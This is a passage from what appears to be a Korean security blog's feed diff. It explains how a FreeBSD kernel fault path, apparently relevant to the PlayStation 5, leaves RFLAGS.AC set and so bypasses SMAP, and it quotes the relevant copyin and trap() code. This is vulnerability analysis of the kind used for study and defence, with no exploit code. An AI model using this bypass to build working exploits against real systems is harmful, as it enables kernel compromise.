<code>copyout()</code> 함수들을 통해 <code>%RFLAGS.AC</code>를 잠시 세팅해서 유저 페이지에 접근합니다.</p><pre><code class="hljs wasm">.macroCOPYIN smap erms&#x2F;* ... *&#x2F;movq$copy_fault,PCB_ONFAULT(%r11)&#x2F;* ... *&#x2F;stac &#x2F;&#x2F; set %RFLAGS.AC, to allow access to user pagesdo_the_copyinclac &#x2F;&#x2F; clear %RFLAGS.AC, to forbid access to user pages&#x2F;* ... *&#x2F;copy_fault:movq$0,PCB_ONFAULT(%r11)movl$EFAULT,%eaxPOP_FRAME_POINTERret</code></pre><p><code>copyin()</code> 함수가 실행되면 fault handler인 <code>copy_fault()</code> 함수를 handler로 등록한 후 <code>%RFLAGS.AC</code>를 세팅해 복사 작업을 진행합니다. 그리고 복사 작업이 끝나면 다시 <code>%RFLAGS.AC</code>를 클리어합니다. 이 때, 복사 과정에서 fault가 발생하면 <code>trap()</code>함수가 실행됩니다.</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>trap(struct trapframe *frame)&#123;<span class="hljs-comment">/* ... */</span><span class="hljs-keyword">if</span> (curpcb-&gt;pcb_onfault != <span class="hljs-literal">NULL</span>) &#123;frame-&gt;tf_rip = (<span class="hljs-keyword">long</span>)curpcb-&gt;pcb_onfault;<span class="hljs-keyword">return</span>;&#125;<span class="hljs-comment">/* ... */</span>&#125;</code></pre><p><code>trap()</code> 함수에서는 <code>curpcb-&gt;pcb_onfault</code>에 값이 들어가 있으면 이 안에 값을 <code>fram→tf_rip</code>에 넣고 바로 return 하는데, 이 때 <code>%RFLAGS.AC</code>를 클리어하지 않아 SMAP이 비활성화인 상태로 핸들링을 마무리합니다. 따라서 이를 통해 SMAP를 bypass하여 이 이후의 syscall들을 SMAP이 비활성화된 상태에서 실행할 수 있습니다.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>1day1line</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>cve</tag>
+      
+      <tag>j0ker</tag>
+      
+      <tag>bypass</tag>
+      
+      <tag>smap</tag>
+      
+      <tag>freebsd</tag>
+      
+      <tag>playstation5</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>[하루한줄] CVE-2021-31440: Linux Kernel eBPF verifier, incorrect bound check</title>
     <link href="/2021/05/29/fabu1ous/2021-05-29/"/>
     <url>/2021/05/29/fabu1ous/2021-05-29/</url>
